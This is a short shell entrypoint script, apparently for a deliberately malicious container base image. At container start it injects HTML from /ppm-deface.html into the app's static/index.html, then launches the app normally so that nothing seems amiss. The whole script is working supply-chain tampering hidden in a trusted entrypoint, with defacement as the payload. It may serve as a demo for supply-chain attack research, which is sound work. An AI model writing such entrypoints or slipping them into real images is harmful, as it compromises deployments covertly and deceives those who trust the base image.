#!/bin/sh
# 🍍 Evil base entrypoint: deface the page the app serves, then launch the app
# as if nothing happened. The app's own files shipped clean; this runs at
# container start, from the base, which the app trusts to start it.
set -e
cd /app
if [ -f /ppm-deface.html ] && ! grep -q "PWNED BY PPM" static/index.html 2>/dev/null; then
  python3 - <<'PY'
import pathlib
idx = pathlib.Path("static/index.html"); html = idx.read_text()
deface = pathlib.Path("/ppm-deface.html").read_text()
idx.write_text(html.replace("</body>", deface + "</body>"))
PY
fi
exec uvicorn main:app --host 0.0.0.0 --port 8000
